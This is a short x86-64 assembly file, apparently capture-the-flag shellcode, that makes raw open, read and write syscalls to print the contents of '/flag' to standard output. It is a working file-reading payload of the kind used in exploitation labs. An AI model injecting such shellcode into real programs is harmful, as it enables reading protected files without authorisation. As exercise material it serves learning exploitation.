.intel_syntax noprefix
.global _start
_start:

// int fd = open("/flag", 0);
mov rax, 2
lea rdi, [rip + flag_path]
mov rsi, 0
syscall

// read(fd, buff, 100);
mov rdi, rax
mov rax, 0 
mov rsi, rsp
mov rdx, 100
syscall

// write(1, buff, 100);
mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 100
syscall

flag_path:
.string "/flag"